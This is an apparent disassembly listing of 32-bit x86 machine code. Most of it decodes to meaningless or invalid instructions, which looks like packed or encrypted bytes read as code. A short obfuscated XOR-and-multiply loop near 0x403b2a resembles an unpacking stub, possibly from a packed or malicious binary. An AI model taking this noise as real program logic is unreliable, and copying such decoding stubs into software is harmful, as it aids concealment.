  40391f:	mov    ds:0x46a45245,eax
  403924:	lds    ecx,FWORD PTR [ebx]
  403926:	and    ah,bl
  403928:	mov    eax,ds:0xa4aaee14
  40392d:	and    bh,BYTE PTR [ecx]
  40392f:	ins    DWORD PTR es:[edi],dx
  403930:	mov    dl,0x77
  403932:	mov    BYTE PTR [eax-0x32],al
  403935:	test   al,0x3f
  403937:	add    al,BYTE PTR [eax+0x5d]
  40393a:	or     DWORD PTR [edx+0x1f],ebx
  40393d:	ror    cl,1
  40393f:	ins    DWORD PTR es:[edi],dx
  403940:	sub    dh,BYTE PTR [eax]
  403942:	add    ebp,DWORD PTR [edi+0x41e9b786]
  403948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403949:	add    DWORD PTR [esi+0x2dcece1d],esi
  40394f:	sub    cl,BYTE PTR [edi+0x11b147eb]
  403955:	mov    ah,0xee
  403957:	mov    edi,0x83b447d2
  40395c:	push   0xd32691de
  403961:	mov    ebx,?
  403963:	jge    0x403996
  403965:	ror    ebx,1
  403967:	push   ebp
  403968:	pop    edi
  403969:	lods   eax,DWORD PTR ds:[esi]
  40396b:	cld    
  40396c:	inc    esp
  40396d:	inc    esp
  40396e:	xlat   BYTE PTR ds:[ebx]
  40396f:	mov    edi,0xf286d807
  403974:	out    dx,al
  403975:	(bad)
  403979:	lahf   
  40397a:	iret   
  40397b:	repz dec ebx
  40397d:	loop   0x4039df
  40397f:	ffree  st(1)
  403981:	mov    esp,0x4b8308d9
  403986:	or     eax,0x62608bb6
  40398b:	mov    dh,0x81
  40398d:	sbb    al,BYTE PTR [eax-0x3c4e50b3]
  403993:	sub    al,0x85
  403995:	es daa 
  403997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403998:	mov    dh,0xce
  40399a:	nop
  40399b:	adc    DWORD PTR [ebp-0x408bb4ff],edi
  4039a1:	retf   
  4039a2:	push   edx
  4039a3:	jno    0x40395c
  4039a5:	add    BYTE PTR [ebp+0x3ab465b8],bh
  4039ab:	jge    0x4039d5
  4039ad:	cmp    eax,0xf96c8c9f
  4039b2:	popa   
  4039b3:	dec    ecx
  4039b4:	sahf   
  4039b5:	push   ebp
  4039b6:	stos   BYTE PTR es:[edi],al
  4039b7:	(bad)  
  4039b9:	arpl   WORD PTR fs:[eax+0x5e],bp
  4039bd:	inc    ebx
  4039be:	mov    eax,ds:0x485d85cc
  4039c3:	call   DWORD PTR [edx-0x5e6d3e3d]
  4039c9:	jmp    0xe6dc:0x76855f58
  4039d0:	add    al,BYTE PTR [ebx-0x35141904]
  4039d6:	retf   
  4039d7:	mul    BYTE PTR [ebx]
  4039d9:	sub    al,0x3a
  4039db:	mov    cl,BYTE PTR [ebx-0x310001f4]
  4039e1:	sbb    eax,0x6305a536
  4039e6:	(bad)  
  4039e7:	mov    ds:0xf2518ca1,eax
  4039ec:	mov    esp,0xac673514
  4039f1:	mov    ds:0x4c9df05a,eax
  4039f6:	in     al,dx
  4039f7:	scas   eax,DWORD PTR es:[edi]
  4039f8:	and    bh,ah
  4039fa:	data16 xor al,0x12
  4039fd:	add    dh,cl
  4039ff:	ja     0x403a4e
  403a01:	retf   0x8cc2
  403a04:	cmc    
  403a05:	sbb    DWORD PTR [esp+esi*8+0x744109ed],0x65
  403a0d:	jp     0x403a0e
  403a0f:	adc    DWORD PTR [ebp+0x1d],esp
  403a12:	or     DWORD PTR [ecx+0x1fc9cc27],0x1d2b6821
  403a1c:	push   0xffffffc5
  403a1e:	jb     0x4039a5
  403a20:	push   eax
  403a21:	loopne 0x4039e7
  403a23:	add    eax,0x21d012d3
  403a28:	mov    edx,0x8b0ff0b9
  403a2d:	xchg   esi,eax
  403a2e:	retf   0x75ef
  403a31:	inc    ebp
  403a32:	jl     0x4039cb
  403a34:	mov    dl,BYTE PTR [eax+0xef9d026]
  403a3a:	jp     0x403a82
  403a3c:	xchg   ecx,eax
  403a3d:	push   cs
  403a3e:	ret    0x133a
  403a41:	fldenv [esi-0x2492c1f8]
  403a47:	scas   eax,DWORD PTR es:[edi]
  403a48:	jns    0x403a70
  403a4a:	cmp    BYTE PTR [edi+0x25027bfc],0xdb
  403a51:	(bad)  
  403a52:	cmp    al,0x6d
  403a54:	xor    al,0x68
  403a56:	leave  
  403a57:	int3   
  403a58:	xor    bl,bh
  403a5a:	and    edx,edi
  403a5c:	in     al,dx
  403a5d:	sub    DWORD PTR [edi],ebx
  403a5f:	xor    eax,0xe3938ca6
  403a64:	jb     0x403a0e
  403a66:	mov    ebp,0x2d041ef5
  403a6b:	sub    eax,0x824db454
  403a70:	popf   
  403a71:	jnp    0x403a4e
  403a73:	xlat   BYTE PTR ds:[ebx]
  403a74:	inc    esi
  403a75:	mov    dl,0xed
  403a77:	(bad)  
  403a78:	inc    edi
  403a79:	pop    ecx
  403a7a:	jecxz  0x403abe
  403a7c:	push   ebx
  403a7d:	adc    edi,ecx
  403a7f:	or     BYTE PTR [eax+0x4e],al
  403a82:	into   
  403a83:	inc    esi
  403a84:	mov    ecx,0x486d6a6f
  403a89:	cmp    DWORD PTR [ebp+0x3314f9e9],0x2c2679ac
  403a93:	dec    ebp
  403a94:	add    eax,0x2ef7f7d
  403a99:	inc    esi
  403a9a:	loope  0x403a66
  403a9c:	sub    BYTE PTR [edx+0x37],0x14
  403aa0:	adc    ecx,DWORD PTR [ecx-0x2b81c00c]
  403aa6:	and    ah,bl
  403aa8:	jae    0x403b10
  403aaa:	dec    edx
  403aab:	call   0x1d26aa7b
  403ab0:	cmp    eax,ebp
  403ab2:	sahf   
  403ab3:	and    eax,0x60203b44
  403ab8:	xor    esi,ebx
  403aba:	mov    eax,ds:0x6ae320c6
  403abf:	cmc    
  403ac0:	add    BYTE PTR [ebp+0x375c98cb],dh
  403ac6:	mov    es,WORD PTR [ebx]
  403ac8:	jae    0x403ae9
  403aca:	lea    edi,[eax+edi*1]
  403acd:	cmp    DWORD PTR [ebp+0x98b03c4],0x444d4b3d
  403ad7:	and    esp,DWORD PTR ss:[eax]
  403ada:	cmp    al,0x11
  403adc:	(bad)  
  403add:	xchg   ebx,eax
  403ade:	out    0x6c,al
  403ae0:	and    al,BYTE PTR [ebx+0x4b]
  403ae3:	jno    0x403b61
  403ae5:	enter  0x5565,0x10
  403ae9:	addr16 mov bh,0x7c
  403aec:	ret    
  403aed:	js     0x403b11
  403aef:	jg     0x403b4f
  403af1:	in     al,0x95
  403af3:	pop    edi
  403af4:	in     al,dx
  403af5:	mov    ch,0xf1
  403af7:	jne    0x403ae9
  403af9:	jbe    0x403b19
  403afb:	stos   BYTE PTR es:[edi],al
  403afc:	fstp   QWORD PTR [ebx]
  403afe:	xchg   esp,eax
  403aff:	lds    ebp,FWORD PTR [esi]
  403b01:	push   cs
  403b02:	dec    ecx
  403b03:	adc    esi,DWORD PTR [eax-0x65d7b80c]
  403b09:	in     al,dx
  403b0a:	xchg   BYTE PTR [eax],cl
  403b0c:	mov    dl,ah
  403b0e:	retf   
  403b0f:	test   al,0xe2
  403b11:	hlt    
  403b12:	stos   BYTE PTR es:[edi],al
  403b13:	xchg   BYTE PTR [ebx],bh
  403b15:	ror    DWORD PTR [ebx+0x4d89f44d],1
  403b1b:	or     BYTE PTR [ebx-0x7bf0f7b3],cl
  403b21:	dec    esi
  403b22:	and    eax,0x30e90000
  403b27:	add    BYTE PTR [eax],al
  403b29:	add    BYTE PTR [ebx+0x558b084d],cl
  403b2f:	clc    
  403b30:	xor    ecx,eax
  403b32:	xor    edx,eax
  403b34:	sub    ecx,edx
  403b36:	sub    ecx,esi
  403b38:	xor    ecx,eax
  403b3a:	mov    DWORD PTR [ebp+0x8],ecx
  403b3d:	mov    ecx,DWORD PTR [ebp+0x8]
  403b40:	mov    edx,DWORD PTR [ebp+0x8]
  403b43:	xor    ecx,eax
  403b45:	imul   edx,edx,0x5708f5
  403b4b:	add    ecx,esi
  403b4d:	lea    ecx,[ebp+ecx*4-0x64]
  403b51:	mov    edi,DWORD PTR [ecx]
  403b53:	add    edx,edi
  403b55:	mov    DWORD PTR [ecx],edx
  403b57:	mov    ecx,DWORD PTR [ebp+0x8]
  403b5a:	xor    ecx,eax
  403b5c:	add    ecx,esi
  403b5e:	jne    0x403b2a
  403b64:	mov    ecx,DWORD PTR [ebp-0x14]
  403b67:	mov    edx,DWORD PTR [ebp+0x8]
  403b6a:	xor    ecx,eax
  403b6c:	xor    edx,eax
  403b6e:	add    ecx,esi
  403b70:	add    edx,esi
  403b72:	cmp    ecx,edx
  403b74:	jae    0x405f8d
  403b7a:	lea    edx,[ecx-0x3272db]
  403b80:	mov    DWORD PTR [ebp-0x18],edx
  403b83:	mov    edi,DWORD PTR [ebp-0x18]
  403b86:	mov    DWORD PTR [ebp-0x24],0x705fd08
  403b8d:	lea    edx,[ebp-0x24]
  403b90:	mov    DWORD PTR [ebp-0x10],edx
  403b93:	mov    edx,DWORD PTR [ebp-0x10]
  403b96:	add    DWORD PTR [edx],0x705fa08
  403b9c:	mov    ebx,DWORD PTR [ebp-0x10]
  403b9f:	xor    edi,eax
  403ba1:	add    edi,DWORD PTR [ebx]
  403ba3:	lea    edx,[ebp+ecx*4-0x64]
  403ba7:	mov    ebx,DWORD PTR [edx]
  403ba9:	xor    edi,ebx
  403bab:	mov    DWORD PTR [edx],edi
  403bad:	jmp    0x405f30
  403bb2:	pop    esi
  403bb3:	stos   BYTE PTR es:[edi],al
  403bb4:	sbb    DWORD PTR [eax],esp
  403bb6:	gs (bad) 
  403bb8:	push   ebx
  403bb9:	lds    ecx,FWORD PTR fs:[ebp+0x5225f475]
  403bc0:	cmp    al,0xb
  403bc2:	sbb    al,0x5f
  403bc4:	bound  esp,QWORD PTR [edx+0x1c]
  403bc7:	pop    edi
  403bc8:	bound  esp,QWORD PTR [edx-0xa]
  403bcb:	stc    
  403bcc:	enter  0xb25c,0xde
  403bd0:	xchg   DWORD PTR [edi-0x1694464d],esp
  403bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bd7:	fcomi  st,st(1)
  403bd9:	ret    0x36b
  403bdc:	push   esp
  403bdd:	ss mov ah,0xab
  403be0:	push   esp
  403be1:	and    edx,0xd
  403be4:	test   al,0x8a
  403be6:	sub    dl,BYTE PTR [ebx-0x5cd8f0f]
  403bec:	or     dh,dh
  403bee:	shl    dl,0xba
  403bf1:	shl    BYTE PTR [eax],cl
  403bf3:	clc    
  403bf4:	in     eax,0x8d
  403bf6:	mov    DWORD PTR cs:[edx-0x61],esp
  403bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bfb:	loopne 0x403c51
  403bfd:	jle    0x403c6e
  403bff:	fcom   QWORD PTR [ebx]
  403c01:	lods   eax,DWORD PTR ds:[esi]
  403c02:	popf   
  403c03:	stc    
  403c04:	sbb    al,0xd5
  403c06:	fldenv [edi-0x23]
  403c09:	ret    
  403c0a:	out    dx,al
  403c0b:	shr    DWORD PTR [eax-0x1c],0x2c
  403c0f:	xor    eax,0xd5b6cc0c
  403c14:	and    bh,dl
  403c16:	out    dx,al
  403c17:	xor    bl,BYTE PTR [ecx+eax*1+0x7ecaf022]
  403c1e:	nop
  403c1f:	adc    ecx,ebx
  403c21:	dec    eax
  403c22:	or     DWORD PTR [ecx],edi
  403c24:	mov    al,ds:0x7da24ee8
  403c29:	mov    ecx,0x847c75f9
  403c2e:	xor    dl,dl
  403c30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c31:	stos   DWORD PTR es:[edi],eax
  403c32:	add    DWORD PTR [ecx+esi*4+0x6a],ebx
  403c36:	lods   al,BYTE PTR ds:[esi]
  403c37:	add    ecx,DWORD PTR [edx-0x495c51b8]
  403c3d:	pop    esi
  403c3e:	mov    ds:0xe6c3a2f2,eax
  403c43:	(bad)  
  403c45:	push   cs
  403c46:	(bad)  
  403c47:	lahf   
  403c48:	jmp    0x403cb0
  403c4a:	(bad)  
  403c4b:	push   eax
  403c4c:	cmp    dh,dl
  403c4e:	adc    dh,BYTE PTR [edx+0x46533c07]
  403c54:	fs dec eax
  403c56:	jno    0x403c79
  403c58:	data16 repnz mov si,0x6fd4
  403c5e:	ret    
  403c5f:	call   0x119aedc7
  403c64:	(bad)
  403c67:	lahf   
  403c68:	inc    ebp
  403c69:	dec    esp
  403c6a:	icebp  
  403c6b:	paddb  mm2,QWORD PTR [ecx-0xc]
  403c6f:	push   ebp
  403c70:	fidiv  WORD PTR [ebx+0x54ad6329]
  403c76:	adc    ah,dh
  403c78:	daa    
  403c79:	and    BYTE PTR [ecx+0x79285b54],bh
  403c7f:	xchg   ebx,eax
  403c80:	test   eax,0xd97f4e29
  403c85:	xor    al,0xb
  403c87:	sub    al,0x6c
  403c89:	sar    dl,1
  403c8b:	popa   
  403c8c:	adc    bh,BYTE PTR [ebp-0x71]
  403c8f:	nop
  403c90:	cmp    dh,BYTE PTR [ebx]
  403c92:	inc    edx
  403c93:	jmp    0x403cb2
  403c95:	cmp    edx,eax
  403c97:	adc    ebp,DWORD PTR [ebx+0x76]
  403c9a:	cmp    DWORD PTR [ebp+0x3c2b509d],ebp
  403ca0:	pop    esp
  403ca1:	pop    ecx
  403ca2:	out    0xc7,al
  403ca4:	stos   DWORD PTR es:[edi],eax
  403ca5:	ins    BYTE PTR es:[edi],dx
  403ca6:	fisubr DWORD PTR [esi-0x46]
  403ca9:	iret   
  403caa:	xor    cl,al
  403cac:	lock rol ch,cl
  403caf:	call   0x69c6:0x5b524635
  403cb6:	jl     0x403d25
  403cb8:	hlt    
  403cb9:	sub    ch,cl
  403cbb:	add    DWORD PTR [edi+0x691c87db],esp
  403cc1:	clc    
  403cc2:	sbb    DWORD PTR [eax+ebx*8],esi
  403cc5:	(bad)  
  403cc7:	pop    ss
  403cc8:	enter  0x3b99,0x3
  403ccc:	mov    ebx,0x973a797a
  403cd1:	adc    esp,eax
  403cd3:	pop    ebp
  403cd4:	mov    WORD PTR [esi+eiz*8+0x748acb85],ss
  403cdb:	(bad)  
  403cdc:	outs   dx,BYTE PTR ds:[esi]
  403cdd:	mul    DWORD PTR [esi+0x78918fc0]
  403ce3:	xchg   ebp,eax
  403ce4:	jne    0x403ce8
  403ce6:	push   ds
  403ce7:	inc    esi
  403ce8:	ins    BYTE PTR es:[edi],dx
  403ce9:	mov    bl,0x13
  403ceb:	mov    al,0x75
  403ced:	bound  esp,QWORD PTR [esi-0x28aff078]
  403cf3:	std    
  403cf4:	or     eax,0xdd5d52a
  403cf9:	xlat   BYTE PTR ds:[ebx]
  403cfa:	and    eax,0xcf7a08dd
  403cff:	stos   BYTE PTR es:[edi],al
  403d00:	test   eax,0xad2a7882
  403d05:	jb     0x403cdc
  403d07:	cmp    esi,DWORD PTR [eax]
  403d09:	or     BYTE PTR [ebp+0x15],0x35
  403d0d:	pop    edi
  403d0e:	scas   al,BYTE PTR es:[edi]
  403d0f:	add    BYTE PTR [ebx-0x4a62deeb],dl
  403d15:	test   al,0xe6
  403d17:	xor    bh,BYTE PTR [ecx+0x3132b648]
  403d1d:	bound  edx,QWORD PTR [edi]
  403d1f:	out    dx,eax
  403d20:	in     al,0x1e
  403d22:	jmp    0x83bb5e1f
  403d27:	or     bh,cl
  403d29:	inc    esi
  403d2a:	lods   al,BYTE PTR ds:[esi]
  403d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d2c:	aam    0xe
  403d2e:	add    BYTE PTR [ecx],0x3b
  403d31:	ins    DWORD PTR es:[edi],dx
  403d32:	add    BYTE PTR [edi],0xb2
  403d35:	pop    ebp
  403d36:	inc    ebx
  403d37:	cmp    ecx,DWORD PTR [edx+eax*1+0x7]
  403d3b:	arpl   WORD PTR [edx],cx
  403d3d:	out    dx,al
  403d3e:	jmp    0xd022a7ff
  403d43:	inc    ebp
  403d44:	jmp    0x403d8c
  403d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d47:	inc    esp
  403d48:	mov    eax,ds:0x39d279aa
  403d4d:	push   ebp
  403d4e:	hlt    
  403d4f:	arpl   bx,dx
  403d51:	jge    0x403d11
  403d53:	je     0x403d92
  403d55:	cld    
  403d56:	pop    edi
  403d57:	xor    DWORD PTR [eax],ebx
  403d59:	push   edi
  403d5a:	mov    ds,WORD PTR [edx-0x44]
  403d5d:	mov    ebp,0xdbc1ca77
  403d62:	out    dx,al
  403d63:	mov    cl,0x9e
  403d65:	pop    es
  403d66:	data16 xor bh,ah
  403d69:	xlat   BYTE PTR ds:[ebx]
  403d6a:	pop    ebx
  403d6b:	sbb    al,0x8a
  403d6d:	or     BYTE PTR [edi+ecx*2],0xd
  403d71:	mov    dl,0xce
  403d73:	in     ax,dx
  403d75:	pop    ebx
  403d76:	fdivr  QWORD PTR [eax]
  403d78:	pop    esp
  403d79:	dec    BYTE PTR [ebp+0x30]
  403d7c:	push   cs
  403d7d:	leave  
  403d7e:	in     al,dx
  403d7f:	sahf   
  403d80:	jo     0x403da8
  403d82:	pop    ss
  403d83:	stos   BYTE PTR es:[edi],al
  403d84:	jns    0x403d3b
  403d86:	cmp    bh,ah
  403d88:	jno    0x403da0
  403d8a:	adc    al,0xf3
  403d8c:	clc    
  403d8d:	dec    edx
  403d8e:	pop    ds
  403d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d90:	(bad)
  403d93:	scas   eax,DWORD PTR es:[edi]
  403d94:	push   ecx
  403d95:	cmp    al,0x95
  403d97:	test   al,0x8d
  403d99:	xchg   ebx,eax
  403d9a:	(bad)  
  403d9b:	(bad)  [esi]
  403d9d:	jmp    0xda0a:0xcbfb4d49
  403da4:	dec    edx
  403da5:	js     0x403da9
  403da7:	(bad)  
  403da8:	cmp    cl,BYTE PTR [edx]
  403daa:	and    DWORD PTR [ebp+0x6d],edx
  403dad:	aaa    
  403dae:	sbb    ebx,DWORD PTR [edx-0x75bfc1f8]
  403db4:	mov    esi,0x1617cff8
  403db9:	ficomp WORD PTR [ebx-0x7c542e46]
  403dbf:	adc    dl,al
  403dc1:	repz sti 
  403dc3:	sub    ecx,edx
  403dc5:	push   DWORD PTR [ecx+ecx*4+0x66]
  403dc9:	push   cs
  403dca:	dec    esi
  403dcb:	mov    ebp,0xd309d10e
  403dd0:	mov    ds,ebx
  403dd2:	fld    DWORD PTR [esi+0x6b]
  403dd5:	(bad)  
  403dd7:	test   al,0x79
  403dd9:	pushf  
  403dda:	dec    eax
  403ddb:	fisttp DWORD PTR [ebx]
  403ddd:	lods   al,BYTE PTR ds:[esi]
  403dde:	nop
  403ddf:	jg     0x403d79
  403de1:	adc    eax,DWORD PTR [eax-0x4f]
  403de4:	inc    ebx
  403de5:	pop    ss
  403de6:	call   0x478f:0xd59c1e2c
  403ded:	or     ah,BYTE PTR [edx-0x1c6ef89a]
  403df3:	sbb    edi,DWORD PTR [ebx+ecx*8+0x26]
  403df7:	repnz ins DWORD PTR es:[edi],dx
  403df9:	mov    ds:0xe2a21751,al
  403dfe:	adc    DWORD PTR [ecx-0x74],ecx
  403e01:	daa    
  403e02:	cmp    edi,edx
  403e04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e05:	push   edx
  403e06:	inc    ebp
  403e07:	mov    edi,0xbd4c69a9
  403e0c:	or     edx,DWORD PTR ds:0xc28bd431
  403e12:	sti    
  403e13:	scas   eax,DWORD PTR es:[edi]
  403e14:	xor    al,0xff
  403e16:	sbb    al,0xf8
  403e18:	sub    dl,BYTE PTR [esi-0x7ea97d65]
  403e1e:	scas   eax,DWORD PTR es:[edi]
  403e1f:	das    
  403e20:	lods   al,BYTE PTR ds:[esi]
  403e21:	inc    edi
  403e22:	and    al,0x31
  403e24:	or     al,0x65
  403e26:	dec    ebx
  403e27:	jecxz  0x403e13
  403e29:	sbb    al,0xaf
  403e2b:	xor    ecx,DWORD PTR [ebx+0x36]
  403e2e:	fwait
  403e2f:	mov    ds:0x917ddb32,eax
  403e34:	pop    ss
  403e35:	cld    
  403e36:	xor    eax,0xf845b38b
  403e3b:	inc    edx
  403e3c:	into   
  403e3d:	cmp    DWORD PTR [edi],esi
  403e3f:	dec    edi
  403e40:	and    dl,BYTE PTR [ecx]
  403e42:	cmp    DWORD PTR [ecx-0x5b],edx
  403e45:	lods   eax,DWORD PTR ds:[esi]
  403e46:	ror    BYTE PTR [esp+edx*2-0x2e32078],1
  403e4d:	xchg   edx,eax
  403e4e:	xor    bl,BYTE PTR ds:[ebx-0x37fd5a72]
  403e55:	or     ch,BYTE PTR [ebp+0x21]
  403e58:	jnp    0x403e14
  403e5a:	das    
  403e5b:	jne    0x403e13
  403e5d:	pushf  
  403e5e:	stc    
  403e5f:	test   BYTE PTR [ebp+0x4d7d91e6],ah
  403e65:	add    edi,DWORD PTR [edi]
  403e67:	add    ecx,DWORD PTR [esi+eax*2+0x7dc8edcc]
  403e6e:	dec    edx
  403e6f:	test   DWORD PTR [ecx+edx*4],0xac58a6e7
  403e76:	xchg   BYTE PTR [ecx+0x4066d06e],dl
  403e7c:	adc    ch,ah
  403e7e:	xor    DWORD PTR [edi-0x7a],edi
  403e81:	and    BYTE PTR [eax+0x4b],bl
  403e84:	sub    eax,0xd5faf2d3
  403e89:	xchg   esi,eax
  403e8a:	adc    cl,dl
  403e8c:	(bad)  
  403e8d:	(bad)  
  403e8e:	and    al,0x79
  403e90:	cmc    
  403e91:	mov    esp,0x4f19c828
  403e96:	xor    esi,DWORD PTR [ecx+0x1abeb82e]
  403e9c:	mov    ecx,0x72a7a548
  403ea1:	add    ebx,edx
  403ea3:	sub    al,0x2f
  403ea5:	xor    BYTE PTR [esi+0x115f9b48],bh
  403eab:	cmp    DWORD PTR [ecx+esi*1-0x21],edx
  403eaf:	jno    0x403f0a
  403eb1:	inc    esp
  403eb2:	loop   0x403f08
  403eb4:	retf   0x9b44
  403eb7:	pusha  
  403eb8:	test   eax,0xedf62e9f
  403ebd:	imul   ebx,DWORD PTR [ebx],0x11c040d7
  403ec3:	retf   
  403ec4:	in     al,0x22
  403ec6:	dec    esi
  403ec7:	pop    edi
  403ec8:	test   DWORD PTR [eax+0x6a],edi
  403ecb:	jne    0x403e5f
  403ecd:	mov    bh,0x37
  403ecf:	and    DWORD PTR [ebp-0x6],esi
  403ed2:	xchg   ebp,eax
  403ed3:	mov    ah,0xc
  403ed5:	push   esi
  403ed6:	test   DWORD PTR [esi],esp
  403ed8:	test   al,0x2c
  403eda:	aas    
  403edb:	cmp    bl,BYTE PTR [esi]
  403edd:	push   edi
  403ede:	pop    ebp
  403edf:	pop    ebx
  403ee0:	sub    ecx,esi
  403ee2:	retf   0xba3
  403ee5:	aaa    
  403ee6:	pop    ecx
  403ee7:	mov    ebp,0x25566a14
  403eec:	jo     0x403e6f
  403eee:	repnz adc esp,DWORD PTR [bx+si]
  403ef2:	in     al,dx
  403ef3:	cld    
  403ef4:	repnz and DWORD PTR [ecx],0xffffffe9
  403ef8:	stc    
  403ef9:	(bad)  
  403efa:	shr    DWORD PTR [ecx],cl
  403efc:	mov    cl,0x95
  403efe:	ret    0xe9ee
  403f01:	dec    edi
  403f02:	cmp    dl,bh
  403f04:	cld    
  403f05:	retf   
  403f06:	xchg   esp,eax
  403f07:	mov    dl,0x50
  403f09:	aaa    
  403f0a:	cwde   
  403f0b:	sbb    DWORD PTR [ecx+eiz*1-0x50],0x49
  403f10:	mov    dh,0xd4
  403f12:	xor    al,0x83
  403f14:	xchg   edi,eax
  403f15:	icebp  
  403f16:	out    dx,eax
  403f17:	sbb    cl,BYTE PTR [esi]
  403f19:	push   es
  403f1a:	mov    ds:0xe1e92a18,eax
  403f1f:	popf   
  403f20:	xchg   ebx,eax
  403f21:	fs mov al,0x32
  403f24:	sar    BYTE PTR [ecx-0xa5a56de],cl
  403f2a:	rcr    BYTE PTR [ebx],cl
  403f2c:	mov    ds:0xfabbe954,eax
  403f31:	jmp    0x403f62
  403f33:	popf   
  403f34:	or     BYTE PTR [edx+0x5224bf94],al
  403f3a:	retf   0x1c15
  403f3d:	push   edi
  403f3e:	xor    eax,0x5e73f31e
  403f43:	xor    eax,0xc09a6691
  403f48:	cmp    al,al
  403f4a:	jb     0x403f01
  403f4c:	mov    esi,0x1eb21cc7
  403f51:	jns    0x403f94
  403f53:	xchg   edi,eax
  403f54:	sbb    al,BYTE PTR [ebx-0x402f85e3]
  403f5a:	in     eax,dx
  403f5b:	shr    bl,1
  403f5d:	aaa    
  403f5e:	push   0xffffffc9
  403f60:	rol    BYTE PTR [ebx],cl
  403f62:	push   edx
  403f63:	(bad)  
  403f64:	lock shr BYTE PTR [edx+0x68fb507d],0x8c
  403f6c:	mov    esp,0x4fb84f95
  403f71:	nop
  403f72:	stos   BYTE PTR es:[edi],al
  403f73:	mov    ebp,DWORD PTR [edi-0x7aca0b30]
  403f79:	add    al,0x8d
  403f7b:	fidivr WORD PTR [esi-0x71]
  403f7e:	lods   eax,DWORD PTR ds:[esi]
  403f80:	xchg   DWORD PTR [eax],edi
  403f82:	mov    WORD PTR [edx+ebx*4],fs
  403f85:	mov    al,ds:0x644412aa
  403f8a:	xchg   esp,eax
  403f8b:	jmp    0x403fcc
  403f8d:	out    0xd6,al
  403f8f:	test   al,0xf8
  403f91:	mov    edx,0x900b8c67
  403f96:	add    ah,BYTE PTR [eax]
  403f98:	inc    edx
  403f99:	in     eax,dx
  403f9a:	out    0x8b,al
  403f9c:	or     ecx,DWORD PTR [ecx-0x2eff35b1]
  403fa2:	imul   esi,edx,0xffffff80
  403fa5:	je     0x403f84
  403fa7:	jne    0x403fd4
  403fa9:	jo     0x403f7e
  403fab:	cs ror edx,0xf9
  403faf:	fidiv  DWORD PTR [ebx+0x47f24a01]
  403fb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fb6:	cmp    al,0x23
  403fb8:	pop    edi
  403fb9:	aaa    
  403fba:	stos   DWORD PTR es:[edi],eax
  403fbb:	push   ebp
  403fbc:	addr16 mov ebx,0xb0d92b2f
  403fc2:	into   
  403fc3:	aam    0xa4
  403fc5:	inc    eax
  403fc6:	jp     0x403fa0
  403fc8:	out    0x3e,eax
  403fca:	cdq    
  403fcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fcc:	jb     0x404002
  403fce:	and    ebp,DWORD PTR [esi]
  403fd0:	mov    ebp,0x645a5fd3
  403fd5:	mov    eax,ds:0x2a9f9d10
  403fda:	jmp    0x403f65
  403fdc:	cbw    
  403fde:	push   esp
  403fdf:	stc    
  403fe0:	cmp    eax,0xf97f56fe
  403fe5:	ss int 0xeb
  403fe8:	adc    BYTE PTR gs:[ecx],dh
  403feb:	fistp  WORD PTR [esi+0x15]
  403fee:	jae    0x403f7e
  403ff0:	xor    al,0x17
  403ff2:	je     0x403fc7
  403ff4:	jnp    0x40400d
  403ff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ff7:	jmp    0x9fe1:0xc06c1e85
  403ffe:	mov    DWORD PTR [ebp+eiz*1-0x64],ebp
  404002:	mov    esi,0x8b131cc4
  404007:	xor    eax,0xe787ccd1
  40400c:	add    edx,DWORD PTR [ecx+ecx*4-0x2b]
  404010:	out    dx,eax
  404011:	ja     0x403ff9
  404013:	adc    BYTE PTR [edi+0x32c02176],ch
  404019:	loop   0x403fb0
  40401b:	sub    al,0xb6
  40401d:	add    BYTE PTR [ecx-0x7f],bl
  404020:	cmp    al,0x63
  404022:	ficom  DWORD PTR [ebx]
  404024:	sar    DWORD PTR [ebp-0x4571bf43],0x9e
  40402b:	data16 and bh,bl
  40402e:	jmp    0x69b7:0x410b02bf
  404035:	call   0x32f8:0xe014ed79
  40403c:	lock sub edx,DWORD PTR [edx]
  40403f:	push   ds
  404040:	add    DWORD PTR [ebx+0x1ff30274],eax
  404046:	addr16 sbb eax,0x6223f3d1
  40404c:	mov    ah,0xe8
  40404e:	xlat   BYTE PTR ds:[ebx]
  40404f:	or     al,0xdc
  404051:	cdq    
  404052:	add    ah,BYTE PTR es:[esi+0xd]
  404056:	inc    eax
  404057:	cmc    
  404058:	stos   BYTE PTR es:[edi],al
  404059:	repz lds ebx,FWORD PTR [bx+di]
  40405d:	jns    0x40403b
  40405f:	inc    edx
  404060:	(bad)  
  404061:	xor    eax,0xe4cd5f29
  404066:	repz xchg esp,eax
  404068:	pop    ebx
  404069:	xor    DWORD PTR [eax+0x4a995fec],0x96c4b42b
  404073:	or     al,0xef
  404075:	jge    0x404076
  404077:	mov    bl,0x4d
  404079:	push   0x35
  40407b:	pop    edx
  40407c:	ins    DWORD PTR es:[edi],dx
  40407d:	ss or  al,0x27
  404080:	mov    al,ds:0x5f1017a3
  404085:	xchg   ecx,eax
  404086:	bnd retw 0x908b
  40408b:	outs   dx,DWORD PTR ds:[esi]
  40408c:	sbb    ecx,edi
  40408e:	jge    0x40403a
  404090:	data16 sub BYTE PTR [eax+0x277cb14c],cl
  404097:	cli    
  404098:	mov    eax,ds:0xa7067372
  40409d:	bndstx [ecx],bnd1
  4040a0:	imul   edi,DWORD PTR [edi],0x1
  4040a3:	fstp   QWORD PTR [ebp-0x6d79ba81]
  4040a9:	mov    ebx,0x4d862b2b
  4040ae:	or     DWORD PTR [ecx],0x1003913d
  4040b4:	mov    ecx,0x11c66bfb
  4040b9:	add    al,0x48
  4040bb:	sub    eax,ecx
  4040bd:	sbb    ah,BYTE PTR [edi+0x52]
  4040c0:	out    dx,al
  4040c1:	xchg   ecx,eax
  4040c2:	jbe    0x40411f
  4040c4:	fs jmp 0x404125
  4040c7:	bound  ebx,QWORD PTR [eax-0x56]
  4040ca:	pop    esi
  4040cb:	stc    
  4040cc:	cli    
  4040cd:	mov    ss,ecx
  4040cf:	test   ecx,ebp
  4040d1:	aas    
